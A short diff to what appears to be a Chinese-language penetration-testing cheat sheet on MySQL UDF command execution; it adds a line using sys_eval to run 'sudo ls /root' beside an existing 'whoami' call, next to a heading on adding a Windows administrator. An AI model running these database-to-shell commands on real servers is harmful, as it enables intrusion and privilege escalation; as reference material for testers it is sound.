@@ -95,6 +95,7 @@ select * from mysql.func; //查看自定义的函数
 drop function sys_eval; //删除自定义函数
 
 select sys_eval('whoami'); //使用函数
+select sys_eval('sudo ls /root'); 
 ```
 windows加用户并加入管理员组
 ```
